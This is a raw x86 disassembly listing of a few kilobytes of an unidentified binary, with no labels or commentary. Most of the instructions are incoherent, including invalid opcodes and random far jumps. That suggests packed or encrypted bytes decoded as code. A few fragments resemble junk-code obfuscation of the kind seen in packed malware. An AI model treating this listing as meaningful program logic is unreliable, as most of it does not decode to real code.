  40696f:	arpl   WORD PTR [ebx*4-0x48ac647d],di
  406976:	fwait
  406977:	cli    
  406978:	inc    edi
  406979:	xchg   esp,eax
  40697a:	hlt    
  40697b:	push   cs
  40697c:	sub    al,0x80
  40697e:	fst    st(2)
  406980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406981:	mov    edi,DWORD PTR [edx+0x2b9af32c]
  406987:	cmc    
  406988:	mov    ebp,0x2db5d270
  40698d:	jb     0x4069d7
  40698f:	enter  0x5646,0xba
  406993:	mov    bh,0xd5
  406995:	pop    ecx
  406996:	adc    ecx,DWORD PTR [eax]
  406998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406999:	mov    bh,0x8d
  40699b:	fisttp QWORD PTR [esi+0x69cc17c1]
  4069a1:	cs cmp ecx,DWORD PTR gs:[ebx]
  4069a5:	mov    ebx,0xb87b49ab
  4069aa:	jge    0x406a29
  4069ac:	jmp    0xe1d3:0xd476dfc9
  4069b3:	mov    bh,al
  4069b5:	in     al,dx
  4069b6:	jne    0x406964
  4069b8:	push   0xffffff9d
  4069ba:	add    BYTE PTR [esi+0x79],bl
  4069bd:	hlt    
  4069be:	sbb    dl,bh
  4069c0:	(bad)  [esi-0x6a0e034c]
  4069c6:	test   eax,0x5623fa73
  4069cb:	push   esi
  4069cc:	aad    0x6d
  4069ce:	mov    esi,0x1f05f2e2
  4069d3:	xchg   esi,eax
  4069d4:	jl     0x406a07
  4069d6:	mov    ebx,0x738e5c7e
  4069dc:	rcl    DWORD PTR [eax+edi*1-0x1e],1
  4069e0:	xchg   edx,eax
  4069e1:	and    ebp,DWORD PTR [esi+0x6a]
  4069e4:	stos   DWORD PTR es:[edi],eax
  4069e5:	jno    0x4069e3
  4069e7:	ret    0x52c0
  4069ea:	or     BYTE PTR [ecx+esi*4-0x23],ch
  4069ee:	imul   eax,DWORD PTR [ebp-0x5e5dd84c],0x21
  4069f5:	mov    esi,0x17a2aa95
  4069fa:	fdivr  st(3),st
  4069fc:	dec    eax
  4069fd:	lock pop ecx
  4069ff:	stc    
  406a00:	and    bl,BYTE PTR [eax+0x21]
  406a03:	cmc    
  406a04:	shl    BYTE PTR [ebp-0x30],1
  406a07:	repz sbb BYTE PTR [edx-0x2c],dl
  406a0b:	aas    
  406a0c:	fnstenv [eax]
  406a0e:	xchg   DWORD PTR [esi-0x3b],edx
  406a11:	add    eax,0x4802166b
  406a16:	xchg   ecx,eax
  406a17:	sbb    eax,0x719af531
  406a1c:	popf   
  406a1d:	cmc    
  406a1e:	test   DWORD PTR [esp+ebp*1+0x44],ebp
  406a22:	jg     0x406a6f
  406a24:	cmp    al,0x6d
  406a26:	xor    al,0x5f
  406a28:	sbb    BYTE PTR [eax-0x2cb12530],dh
  406a2e:	jbe    0x406a66
  406a30:	fadd   st(3),st
  406a32:	inc    edi
  406a33:	xchg   BYTE PTR [eax-0x72],al
  406a36:	sub    edi,esi
  406a38:	push   esp
  406a39:	inc    esp
  406a3a:	sbb    bl,BYTE PTR ds:[ecx-0x49]
  406a3e:	jb     0x406a8d
  406a40:	push   ebx
  406a41:	imul   esp,DWORD PTR [edi+0x387e871b],0xf97e0658
  406a4b:	or     cl,BYTE PTR [ecx]
  406a4d:	fimul  WORD PTR [edx-0x15]
  406a50:	jl     0x406a4e
  406a52:	addr16 in al,dx
  406a54:	ret    
  406a55:	ds pop edx
  406a57:	push   ds
  406a58:	clc    
  406a59:	xchg   esp,eax
  406a5a:	jo     0x406ab6
  406a5c:	xchg   ecx,eax
  406a5d:	pusha  
  406a5e:	push   ebx
  406a5f:	push   ss
  406a60:	mov    cl,0x2d
  406a62:	mov    ebp,DWORD PTR [ebx]
  406a64:	stos   BYTE PTR es:[edi],al
  406a65:	ss pop ebp
  406a67:	and    ch,bl
  406a69:	inc    edx
  406a6a:	fsub   DWORD PTR [esi+0x4e537827]
  406a70:	icebp  
  406a71:	mov    esp,0x60a4ffc4
  406a76:	inc    eax
  406a77:	imul   ebx,DWORD PTR [ecx+0x3],0xd96244f2
  406a7e:	sbb    esp,DWORD PTR [esi+ecx*4]
  406a81:	mov    esp,0xc1336632
  406a86:	mov    ecx,0x3b00
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x1552:0xd9dda5c
  406abc:	mov    bh,0x21
  406abe:	pusha  
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	scas   eax,DWORD PTR es:[edi]
  406ac7:	loope  0x406a9c
  406ac9:	outs   dx,BYTE PTR ds:[esi]
  406aca:	loope  0x406afd
  406acc:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  406ace:	arpl   cx,bx
  406ad0:	jbe    0x406ae9
  406ad2:	pop    edi
  406ad3:	popa   
  406ad4:	and    DWORD PTR [edi-0x36],ebx
  406ad7:	stc    
  406ad8:	sub    dl,ch
  406ada:	adc    ebp,eax
  406adc:	or     eax,0x7de19173
  406ae1:	sub    ebx,edi
  406ae3:	jle    0x406aa2
  406ae5:	dec    esi
  406ae6:	jp     0x406a9e
  406ae8:	add    dl,bh
  406aea:	pushf  
  406aeb:	outs   dx,DWORD PTR ds:[esi]
  406aec:	mov    al,0xa1
  406aee:	(bad)  
  406aef:	les    edx,FWORD PTR [eax+ebp*2-0x7b448cdb]
  406af6:	popa   
  406af7:	and    eax,DWORD PTR [edi+0x23c261fb]
  406afd:	adc    bh,BYTE PTR [esi+0x7679db5e]
  406b03:	mov    esi,0x6e87287a
  406b08:	adc    BYTE PTR [ebx],0x48
  406b0b:	inc    esp
  406b0c:	mov    eax,ds:0xf22485ff
  406b11:	sbb    esp,DWORD PTR [edx]
  406b13:	loope  0x406b3a
  406b15:	jecxz  0x406b04
  406b17:	cmp    eax,0xbb019a4
  406b1c:	xchg   edi,eax
  406b1d:	sar    BYTE PTR [edx-0x6e93b481],cl
  406b23:	dec    ebx
  406b24:	stos   BYTE PTR es:[edi],al
  406b25:	pop    ebx
  406b26:	in     eax,dx
  406b27:	aas    
  406b28:	js     0x406b6b
  406b2a:	xlat   BYTE PTR ds:[ebx]
  406b2b:	fcomp  DWORD PTR [edx-0x64]
  406b2e:	adc    al,0x7d
  406b30:	cmp    ecx,0x5d76a9dd
  406b36:	pop    ecx
  406b37:	adc    bl,BYTE PTR [edx-0x1de89a50]
  406b3d:	push   ss
  406b3e:	mov    ds:0xeb5252e7,eax
  406b43:	dec    esi
  406b44:	shl    BYTE PTR [edi-0x15d4846f],0x59
  406b4b:	mov    esp,0x3a587e4a
  406b50:	(bad)  
  406b52:	mov    esp,DWORD PTR ss:[edi]
  406b55:	sub    cl,ah
  406b57:	adc    eax,0x65f3ef5b
  406b5c:	push   ebx
  406b5d:	inc    edx
  406b5e:	mov    al,0xf3
  406b60:	test   al,dl
  406b62:	in     al,dx
  406b63:	mov    eax,DWORD PTR [ebp-0x7dfe63c0]
  406b69:	and    dl,BYTE PTR [ebx-0x5862f8dc]
  406b6f:	mov    dh,0x3a
  406b71:	lahf   
  406b72:	pop    esp
  406b73:	in     al,0x80
  406b75:	clc    
  406b76:	hlt    
  406b77:	xor    edi,eax
  406b79:	aaa    
  406b7a:	sub    BYTE PTR [edx+0x41f938f2],bh
  406b80:	clc    
  406b81:	mov    ah,0x51
  406b83:	mov    bl,0xa6
  406b85:	sbb    eax,0xb9690f85
  406b8a:	push   edx
  406b8b:	leave  
  406b8c:	dec    edx
  406b8d:	(bad)  
  406b90:	lock inc ebx
  406b92:	pop    edx
  406b93:	pushf  
  406b94:	and    DWORD PTR [esi+0x779293bd],esi
  406b9a:	enterw 0x13b3,0x55
  406b9f:	push   0xdc058581
  406ba4:	fnstsw WORD PTR [edi+0x4]
  406ba7:	call   0x3e32a66f
  406bac:	cdq    
  406bad:	jmp    0x2190:0xf4c6242
  406bb4:	cmp    DWORD PTR [edx],edi
  406bb6:	ss sti 
  406bb8:	test   BYTE PTR [edi],dh
  406bba:	js     0x406c00
  406bbc:	cwde   
  406bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bbe:	dec    ebx
  406bbf:	aad    0x41
  406bc1:	dec    DWORD PTR [ebx-0x5]
  406bc4:	and    al,0x29
  406bc6:	jp     0x406b64
  406bc8:	pop    ebp
  406bc9:	inc    ebp
  406bca:	push   esi
  406bcb:	inc    BYTE PTR [edx-0x35]
  406bce:	call   0x329750c3
  406bd3:	dec    edx
  406bd4:	pop    ss
  406bd5:	xchg   ecx,eax
  406bd6:	mov    ds:0x668e4aee,al
  406bdb:	test   DWORD PTR [ecx+0x4d9f6e8e],esi
  406be1:	push   ebp
  406be2:	xor    DWORD PTR [ecx+eiz*8+0x769ea3ee],eax
  406be9:	retf   0x1525
  406bec:	push   ss
  406bed:	add    cl,ch
  406bef:	ret    0x2448
  406bf2:	mov    ebp,0xb0c1a028
  406bf7:	xor    eax,0x5867cb0f
  406bfc:	aam    0x95
  406bfe:	xchg   esi,eax
  406bff:	mov    ch,0x49
  406c01:	or     BYTE PTR ds:0xac377d62,ah
  406c07:	arpl   WORD PTR gs:[ecx],bp
  406c0a:	enter  0x5db,0x9c
  406c0e:	or     dh,BYTE PTR [eax+ebp*1+0x3e8892d8]
  406c15:	sbb    BYTE PTR [edx],al
  406c17:	scas   eax,DWORD PTR es:[edi]
  406c18:	sbb    ebx,DWORD PTR [edx+0x33]
  406c1b:	push   edx
  406c1c:	rol    BYTE PTR [eax],cl
  406c1e:	fsub   DWORD PTR [eax-0x15]
  406c21:	mov    dl,cl
  406c23:	nop
  406c24:	sbb    eax,0xe601a6a8
  406c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c2a:	(bad)  
  406c2b:	nop
  406c2c:	fbld   TBYTE PTR [ebp+0x44ef93d1]
  406c32:	cmp    edx,DWORD PTR [edi+0x59]
  406c35:	jne    0x406bff
  406c37:	arpl   WORD PTR [ecx+0x5b7c9acf],bp
  406c3d:	or     ecx,DWORD PTR [ecx-0x1d]
  406c40:	mov    dh,0x7d
  406c42:	xchg   bx,ax
  406c44:	and    al,0xe9
  406c46:	mov    ecx,edx
  406c48:	inc    eax
  406c49:	jno    0x406c0a
  406c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4c:	dec    esp
  406c4d:	push   esi
  406c4e:	call   0xad59c70d
  406c53:	mov    ch,0x72
  406c55:	out    dx,eax
  406c56:	adc    BYTE PTR [ebp+0x7171c287],ch
  406c5c:	mov    ebx,eax
  406c5e:	sbb    al,0xe
  406c60:	adc    DWORD PTR [edx+0x42],edi
  406c63:	mov    dl,0xb
  406c65:	retf   0x11b
  406c68:	scas   al,BYTE PTR es:[edi]
  406c69:	sub    al,BYTE PTR [eax+eax*4+0x3e]
  406c6d:	int    0x15
  406c6f:	icebp  
  406c70:	push   cs
  406c71:	sbb    DWORD PTR [esi],ecx
  406c73:	fs pop ebp
  406c75:	pop    ds
  406c76:	das    
  406c77:	test   DWORD PTR [esp+edi*1+0x584b40ec],edi
  406c7e:	push   ds
  406c7f:	push   eax
  406c80:	mov    ebx,0x81c12d51
  406c85:	mov    gs,eax
  406c87:	sbb    BYTE PTR [ebx+0x313e7c7d],dl
  406c8d:	pop    esi
  406c8e:	ret    
  406c8f:	std    
  406c90:	xor    eax,0x38e1a147
  406c95:	out    0xb2,eax
  406c97:	mov    fs,WORD PTR [eax]
  406c99:	dec    ebp
  406c9a:	cmp    dl,bh
  406c9c:	add    DWORD PTR [edi-0x79f99655],eax
  406ca2:	mov    ds:0x4d273609,al
  406ca7:	scas   eax,DWORD PTR es:[edi]
  406ca8:	lea    esi,[edx+0x45]
  406cab:	mov    cl,0x14
  406cad:	in     al,dx
  406cae:	fild   DWORD PTR ss:[ecx-0xf]
  406cb2:	mov    ah,BYTE PTR [ebp+0x211b2e23]
  406cb8:	inc    edx
  406cb9:	lahf   
  406cba:	jp     0x406cfb
  406cbc:	pop    eax
  406cbd:	inc    ebp
  406cbe:	(bad)  
  406cbf:	aad    0xae
  406cc1:	mov    dh,0xea
  406cc4:	xor    DWORD PTR [ebx+0x29],ebp
  406cc7:	imul   edi,DWORD PTR [edx-0x5c],0xd37784c7
  406cce:	rcr    BYTE PTR [edx],0xe6
  406cd1:	sbb    al,0x72
  406cd3:	mov    edi,0x561fc7d5
  406cd8:	mov    bh,0xcb
  406cda:	cdq    
  406cdb:	sbb    BYTE PTR [ecx+eiz*4-0x75],bl
  406cdf:	out    dx,al
  406ce0:	dec    esi
  406ce1:	fnstenv [edx]
  406ce3:	push   0x1cfc143a
  406ce8:	jmp    0x3a67:0xeab3bb60
  406cef:	fwait
  406cf0:	pop    ebp
  406cf1:	fs or  ah,dl
  406cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf5:	ins    BYTE PTR es:[edi],dx
  406cf6:	pop    esp
  406cf7:	push   0x639cae52
  406cfc:	in     al,0x5a
  406cfe:	scas   al,BYTE PTR es:[edi]
  406cff:	mov    bh,0x87
  406d01:	xlat   BYTE PTR ds:[ebx]
  406d02:	mov    ax,WORD PTR [ebp-0x8]
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4336ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43371b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43369b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433643
  406d52:	or     DWORD PTR ds:0x43369f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433657,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43371b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    dl,BYTE PTR ss:[edi-0x26]
  406d82:	mov    DWORD PTR [edx+0x24],ecx
  406d85:	ret    0x7c7c
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d71
  406d8d:	dec    edx
  406d8e:	test   eax,0x4d18abf2
  406d93:	cs mov ebp,0x5bdbe3cd
  406d99:	repnz xchg al,ch
  406d9c:	std    
  406d9d:	daa    
  406d9e:	in     al,0x2e
  406da0:	and    al,0x78
  406da2:	xchg   edi,eax
  406da3:	cmp    esi,0xffffffe4
  406da6:	pop    edi
  406da7:	clc    
  406da8:	xor    al,0x49
  406daa:	ins    BYTE PTR es:[edi],dx
  406dab:	jmp    0x406d4a
  406dad:	std    
  406dae:	push   0xfffffff3
  406db0:	mov    bh,0x93
  406db2:	test   al,0xff
  406db4:	add    ah,ah
  406db6:	xor    BYTE PTR [ebp+0x2f3a9494],al
  406dbc:	add    ebx,DWORD PTR [ecx+eiz*4+0x57deb5d6]
  406dc3:	hlt    
  406dc4:	pop    ss
  406dc5:	in     al,dx
  406dc6:	loopne 0x406e14
  406dc8:	xchg   ecx,eax
  406dc9:	push   eax
  406dca:	adc    BYTE PTR [edx],ch
  406dcc:	rcl    DWORD PTR [edx+0x5efbbc45],cl
  406dd2:	mov    eax,ds:0x8a2fa349
  406dd7:	ins    BYTE PTR es:[edi],dx
  406dd8:	cmp    BYTE PTR [esi-0x18f00139],dl
  406dde:	pop    eax
  406ddf:	cmp    BYTE PTR [edx+0x41c0577e],0xdd
  406de6:	cmp    DWORD PTR ds:0xf9f03ef4,ebx
  406dec:	jbe    0x406d86
  406dee:	xor    eax,0xb1b8bfa9
  406df3:	nop
  406df4:	sub    al,0x7e
  406df6:	jge    0x406d7f
  406df8:	fld    DWORD PTR ds:0xb3c53c7c
  406dfe:	or     ah,dh
  406e00:	inc    BYTE PTR [ebp-0x76e8a91f]
  406e06:	xor    eax,0x321d3612
  406e0b:	push   ss
  406e0c:	shl    ebx,0x2e
  406e0f:	es add eax,0xa737360a
  406e15:	jo     0x406e61
  406e17:	sub    al,0x45
  406e19:	or     DWORD PTR [eax+0x77],esp
  406e1c:	repz mov dl,0x1a
  406e1f:	sbb    al,0xf
  406e21:	mov    WORD PTR [edx-0x3b8931cd],fs
  406e27:	or     eax,0x1cbfb9ab
  406e2c:	sub    eax,0x385a0916
  406e31:	ja     0x406dc2
  406e33:	(bad)  [esi]
  406e35:	sti    
  406e36:	fdiv   QWORD PTR [ebp-0x6c48e79b]
  406e3c:	adc    esp,esi
  406e3e:	mov    ds,WORD PTR [edi+eiz*2]
  406e41:	push   ss
  406e42:	call   0xb247:0x7d8014e1
  406e49:	mov    BYTE PTR ds:0xa03d6fa6,bl
  406e4f:	add    BYTE PTR [edi+0x61c3d0d5],dl
  406e55:	imul   eax,DWORD PTR [ebp+0x3f27c1ea],0xe
  406e5c:	cli    
  406e5d:	sub    al,0x99
  406e5f:	xlat   BYTE PTR ds:[ebx]
  406e60:	call   0x68da:0xb24a2fdb
  406e67:	gs xchg ebp,eax
  406e69:	push   0xffffffa3
  406e6b:	push   edx
  406e6c:	movq   mm2,QWORD PTR [ebp+edx*1+0x7e]
  406e71:	dec    ebx
  406e72:	dec    edi
  406e73:	bound  ecx,QWORD PTR [ebx]
  406e75:	inc    ebx
  406e76:	or     esi,DWORD PTR [esi]
  406e78:	pop    es
  406e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e7a:	sub    edi,edx
  406e7c:	adc    al,0xb5
  406e7e:	dec    ebp
  406e7f:	mov    ah,0x4c
  406e81:	in     al,0xfc
  406e83:	push   ecx
  406e84:	push   edx
  406e85:	dec    edi
  406e86:	push   cs
  406e87:	mov    ebp,0x1e91883b
  406e8c:	xor    BYTE PTR [edi-0x5b],ch
  406e8f:	xchg   ebp,eax
  406e90:	clc    
  406e91:	xor    BYTE PTR [esi+0x721dde8],ah
  406e97:	sbb    al,ah
  406e99:	js     0x406e45
  406e9b:	mov    ecx,0x602bb679
  406ea0:	imul   esi,DWORD PTR [edi+0x38],0xffffffed
  406ea4:	and    eax,0x27d9b089
  406ea9:	xor    eax,0xef1bdcc3
  406eae:	xchg   BYTE PTR [ecx-0x68c997f7],bh
  406eb4:	pop    edi
  406eb5:	cld    
  406eb6:	add    edx,edi
  406eb8:	cli    
  406eb9:	push   ebx
  406eba:	ins    BYTE PTR es:[edi],dx
  406ebb:	test   dh,bh
  406ebd:	push   0x14c44271
  406ec2:	fcomp  DWORD PTR [edx-0x4f6dded]
  406ec8:	mov    esi,0x5c73e57d
  406ecd:	rcl    ebp,cl
  406ecf:	mov    eax,ds:0x8b327734
  406ed4:	dec    esp
  406ed5:	mov    fs,WORD PTR [esi+eiz*4+0x723debc9]
  406edc:	xor    ebx,DWORD PTR [ebx]
  406ede:	pop    ds
  406edf:	xor    DWORD PTR [ebx],eax
  406ee1:	push   0x17
  406ee3:	and    eax,ebx
  406ee5:	stos   DWORD PTR es:[edi],eax
  406ee6:	into   
  406ee7:	sbb    al,0xac
  406ee9:	hlt    
  406eea:	inc    ebx
  406eeb:	popf   
  406eec:	lock call 0xbdc8:0xac651f4d
  406ef4:	repnz pop ebp
  406ef6:	mov    ecx,edx
  406ef8:	mov    DWORD PTR [eax+0x53],ebx
  406efb:	in     al,0x23
  406efd:	test   cl,al
  406eff:	stos   DWORD PTR es:[edi],eax
  406f00:	mul    DWORD PTR [edi+0x2cfead4]
  406f06:	loop   0x406f6f
  406f08:	inc    esp
  406f09:	xor    ecx,DWORD PTR [edx]
  406f0b:	jge    0x406ec0
  406f0d:	ret    0x88c0
  406f10:	push   esp
  406f11:	repnz or ebp,DWORD PTR [ecx]
  406f14:	push   ecx
  406f15:	push   ebp
  406f16:	aas    
  406f17:	loopne 0x406ede
  406f19:	inc    edx
  406f1a:	push   ds
  406f1b:	dec    ebp
  406f1c:	mov    ebp,0xdf010daa
  406f21:	mov    dl,0xf0
  406f23:	or     ebx,DWORD PTR [esi+ebp*1+0x74]
  406f27:	in     eax,dx
  406f28:	scas   al,BYTE PTR es:[edi]
  406f29:	hlt    
  406f2a:	inc    esi
  406f2b:	fst    st(5)
  406f2d:	xchg   ecx,eax
  406f2e:	retf   0xcfc6
  406f31:	aam    0x1c
  406f33:	jmp    0x406f72
  406f35:	jg     0x406ee7
  406f37:	pop    ss
  406f38:	aas    
  406f39:	fsubr  QWORD PTR [ebp+0x5e720bde]
  406f3f:	inc    edi
  406f40:	push   ecx
  406f41:	mov    ds,ebp
  406f43:	aam    0x18
  406f45:	repz retf 0x2c61
  406f49:	jne    0x406f1e
  406f4b:	int3   
  406f4c:	fstp   QWORD PTR [ecx-0x3f42d728]
  406f52:	mov    edx,0xc31a9bf8
  406f57:	or     bl,BYTE PTR [ebp-0x4d]
  406f5a:	push   0xfffffffd
  406f5c:	xchg   ebp,eax
  406f5d:	cwde   
  406f5e:	xor    al,0x8b
  406f60:	(bad)  
  406f62:	fadd   QWORD PTR [ecx+0x68]
  406f65:	push   edx
  406f66:	mov    edi,?
  406f68:	pop    ebp
  406f69:	enter  0x307c,0x30
  406f6d:	push   edx
  406f6e:	les    eax,FWORD PTR [ecx-0x21cc2ac8]
  406f74:	inc    eax
  406f75:	ds pop edi
  406f77:	mov    eax,ds:0x849ebf2a
  406f7c:	mov    ds,WORD PTR [ebx+ebx*2]
  406f7f:	mov    dl,0x17
  406f81:	(bad)  
  406f82:	std    
  406f83:	neg    DWORD PTR [ecx-0x610e53dc]
  406f89:	push   fs
  406f8b:	sub    al,0xbc
  406f8d:	adc    eax,0xd59dd7cc
  406f92:	sub    bh,dl
  406f94:	pop    esp
  406f95:	mov    WORD PTR [esi+ebx*2-0x6374d788],?
  406f9c:	cwde   
  406f9d:	call   0x2876:0x84b30dc5
  406fa4:	out    0x77,eax
  406fa6:	sbb    esp,DWORD PTR [ebp-0x60479fb4]
  406fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fad:	xlat   BYTE PTR ds:[ebx]
  406fae:	rol    BYTE PTR [edx],1
  406fb0:	or     cl,BYTE PTR [edx+ebx*4+0x4c]
  406fb4:	add    dl,BYTE PTR [esi-0x69d998ff]
  406fba:	int3   
  406fbb:	sbb    eax,0xb5423b0b
  406fc0:	pop    ds
  406fc1:	shr    BYTE PTR [esi+eax*1],0x15
  406fc5:	hlt    
  406fc6:	sbb    eax,0xc9e9c283
  406fcb:	xchg   esi,eax
  406fcc:	loope  0x406fe3
  406fce:	(bad)
  406fd2:	rcl    DWORD PTR [edi-0x9],cl
  406fd5:	mov    ch,BYTE PTR [eax+0x48]
  406fd8:	sbb    dh,BYTE PTR [ebp+ebx*4-0x75]
  406fdc:	sub    dl,BYTE PTR [edx-0x36c3af4e]
  406fe2:	imul   esi,DWORD PTR [ebp-0x52]
  406fe6:	les    ecx,FWORD PTR [ebx+edi*4-0x67]
  406fea:	xchg   esp,eax
  406feb:	lods   eax,DWORD PTR ds:[esi]
  406fed:	xchg   ebx,eax
  406fee:	inc    ebp
  406fef:	push   cs
  406ff0:	lahf   
  406ff1:	dec    ecx
  406ff2:	jae    0x406fa5
  406ff4:	adc    cl,BYTE PTR [eax-0xa]
  406ff7:	call   0xa3863aa6
  406ffc:	popf   
  406ffd:	fcomi  st,st(3)
  406fff:	mov    es,WORD PTR [eax]
  407001:	mov    bh,0xc2
  407003:	loop   0x406fe9
  407005:	ja     0x406fa3
  407007:	or     al,0x11
  407009:	sbb    eax,0x8028dcd1
  40700e:	lea    esp,[ebp+0x62]
  407011:	inc    esi
  407012:	inc    ecx
  407013:	imul   esi,DWORD PTR [esi+0x11],0xa9344cc8
  40701a:	inc    eax
  40701b:	sub    al,0x33
  40701d:	repz fsub QWORD PTR [edx+edx*1-0x59b82241]
  407025:	mov    al,0xca
  407027:	inc    ebx
  407028:	test   al,0xc7
  40702a:	mov    ds:0xdd606988,al
  40702f:	xor    BYTE PTR [esi],ah
  407031:	xchg   esp,eax
  407032:	fs inc ecx
  407034:	push   es
  407035:	xor    al,0xb5
  407037:	dec    ebp
  407038:	jno    0x406fd8
  40703a:	and    BYTE PTR [edx-0x7601b5ad],bh
  407040:	jle    0x407061
  407042:	ins    BYTE PTR es:[edi],dx
  407043:	test   DWORD PTR [ecx+0x56],ecx
  407046:	out    dx,al
  407047:	scas   eax,DWORD PTR es:[edi]
  407048:	or     dh,BYTE PTR [edx]
  40704a:	push   edx
  40704b:	cmp    DWORD PTR [edx],ebx
  40704d:	sub    al,0x33
  40704f:	mov    ds:0xa4137355,al
  407054:	mov    bl,0xfc
  407056:	xchg   esp,eax
  407057:	ins    BYTE PTR es:[edi],dx
  407058:	and    cl,BYTE PTR [edx]
  40705a:	bound  edi,QWORD PTR [ebp-0x622f0105]
  407060:	sub    DWORD PTR [ebp+0x2c],eax
  407063:	sbb    BYTE PTR [bx],0x1b
  407067:	sub    ch,bl
  407069:	jno    0x4070db
  40706b:	dec    esp
  40706c:	sar    DWORD PTR [eax],cl
  40706e:	aad    0x7a
  407070:	imul   ebx,esi,0xffffff90
  407073:	js     0x407033
  407075:	imul   esi,ebp,0xffffffcb
  407078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407079:	and    eax,0xe6f1a835
  40707e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40707f:	sub    al,0xb3
  407081:	imul   esp
  407083:	jle    0x4070df
  407085:	out    0x87,eax
  407087:	adc    DWORD PTR [edi],esi
  407089:	addr16 popf 
  40708b:	stos   DWORD PTR es:[edi],eax
  40708c:	ins    DWORD PTR es:[edi],dx
  40708d:	(bad)  
  40708f:	mov    edx,0xb6f65f29
  407094:	push   0xb445da3f
  407099:	xor    DWORD PTR [ecx+0x5a055318],0xffffffbc
  4070a0:	xchg   ebp,eax
  4070a1:	ins    BYTE PTR es:[edi],dx
  4070a2:	inc    edx
  4070a3:	or     al,0xbe
  4070a5:	push   ebp
  4070a6:	pop    ecx
  4070a7:	xchg   esp,eax
  4070a9:	xor    dl,BYTE PTR [esi+0x73]
  4070ac:	pop    ds
  4070ad:	mov    WORD PTR ds:0xe575fd5d,?
  4070b3:	cmp    al,0x4a
  4070b5:	pop    esi
  4070b6:	push   cs
  4070b7:	push   ebx
  4070b8:	aas    
  4070b9:	and    DWORD PTR [eax*4-0x66b8de7c],ebp
  4070c0:	aaa    
  4070c1:	dec    esp
  4070c2:	idiv   BYTE PTR [ebx+0xf445ce0]
  4070c8:	hlt    
  4070c9:	sahf   
  4070ca:	in     eax,dx
  4070cb:	jge    0x407123
  4070cd:	sbb    cl,BYTE PTR ds:0x2fc08d8
  4070d3:	call   0x2f7c:0x4db74439
  4070da:	mov    BYTE PTR [ebp-0x49540476],0x54
  4070e1:	push   edx
  4070e2:	adc    esi,DWORD PTR [ebp-0x27ba76bb]
  4070e8:	and    DWORD PTR ds:0x43364f,0x274d
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4336f3
  407100:	add    ecx,DWORD PTR ds:0x433643
  407106:	mov    DWORD PTR ds:0x4336f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	jmp    FWORD PTR [edi+ecx*4+0x23]
  407120:	jb     0x407121
  407122:	iret   
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x40710d
  40712a:	add    al,0x9
  40712c:	and    dl,BYTE PTR [edx]
  40712e:	daa    
  40712f:	lods   eax,DWORD PTR ds:[esi]
  407130:	cmp    BYTE PTR [eax+ebx*8-0x1df91c66],dl
  407137:	mov    ebx,ds
  407139:	in     al,0xca
  40713b:	mov    cl,0x33
  40713d:	rol    BYTE PTR [ebx-0x7b],1
  407140:	pop    edi
  407141:	js     0x40714c
  407143:	(bad)  
  407144:	arpl   si,si
  407146:	lea    edx,[eax-0x61]
  407149:	pop    es
  40714a:	fmul   DWORD PTR [esi-0x2f17fc29]
  407150:	dec    ecx
  407151:	jns    0x4071c7
  407153:	retf   
  407154:	dec    ecx
  407155:	xchg   edi,eax
  407156:	fild   QWORD PTR [edi]
  407158:	mov    ah,0xd9
  40715a:	lods   eax,DWORD PTR ds:[esi]
  40715b:	pushf  
  40715c:	add    DWORD PTR [ebx+ebx*4-0x68814c6f],ebp
  407163:	push   0x449cd96b
  407168:	imul   esi,DWORD PTR [eax],0xfba84b77
  40716e:	jle    0x4071a9
  407170:	inc    esi
  407171:	dec    esi
  407172:	cwde   
  407173:	push   esi
  407174:	rol    edi,cl
  407176:	aas    
  407177:	mov    cl,0x5c
